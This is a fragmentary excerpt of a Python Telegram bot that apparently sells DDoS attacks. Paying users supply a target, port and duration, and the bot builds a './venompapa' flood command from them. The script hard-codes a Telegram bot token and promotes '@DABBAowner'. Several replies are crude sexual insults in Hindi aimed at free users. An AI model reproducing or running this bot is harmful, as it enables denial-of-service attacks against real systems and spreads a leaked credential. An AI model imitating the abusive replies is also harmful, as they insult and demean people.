...
bot = telebot.TeleBot('7229782346:AAEn-nDQoMb06aOjyRgmdzoTpA1DwRUk93k')
...
def clear_logs_command(message):
    ...
    if user_id in admin_id:
        ...
        response = "You have not purchased yet purchase now from :-  @DABBAowner❄."
    bot.reply_to(message, response)
...
def clear_users_command(message):
    ...
    if user_id in admin_id:
        ...
        response = " Pani Kam Hai matke Mein Teri Man Chod Dunga Main Ek jhatake mein only free member:- @DABBAowner 🙇."
    bot.reply_to(message, response)
...
def show_all_users(message):
    ...
    if user_id in admin_id:
        ...
        response = " Pani Kam Hai matke Mein free Walon Tumhari man Chod Dunga Main jhatake mein:- @@DABBAowner ❄."
    bot.reply_to(message, response)
...
def show_recent_logs(message):
    ...
    if user_id in admin_id:
        ...
        response = " Pani Kam Hai matke Mein free wale Tumhari man Chod Dunga Main Ek jhatake mein:- @DABBAowner ❄."
        bot.reply_to(message, response)
    ...
    if user_id in allowed_user_ids:
        ...
        if len(command) == 4:  # Updated to accept target, time, and port
            ...
            if time > 600:
                ...
                full_command = f"./venompapa {target} {port} {time} 50"
...
Buy From :- @DABBAowner
Official Channel :- yaha tak aagaya madarcod abb lele mere se @DABBAowner
'''
...
3. MAKE SURE YOU JOINED https://t.me/hcucjvicuchcxyz OTHERWISE NOT WORK
